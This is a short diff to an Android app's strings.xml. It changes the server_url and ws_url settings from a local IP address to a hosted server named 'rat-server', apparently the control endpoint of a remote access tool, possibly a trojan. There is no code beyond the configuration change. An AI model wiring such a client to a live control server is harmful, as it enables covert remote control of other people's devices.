@@ -9,7 +9,7 @@
     <string name="btn_cancel">Cancel</string>
 
     <!-- ===== CONFIGURATION: Change these for your server ===== -->
-    <string name="server_url" translatable="false">http://192.168.1.42:5000</string>
-    <string name="ws_url" translatable="false">http://192.168.1.42:5000</string>
+    <string name="server_url" translatable="false">https://rat-server-vc9p.onrender.com</string>
+    <string name="ws_url" translatable="false">https://rat-server-vc9p.onrender.com</string>
     <!-- ====================================================== -->
 </resources>
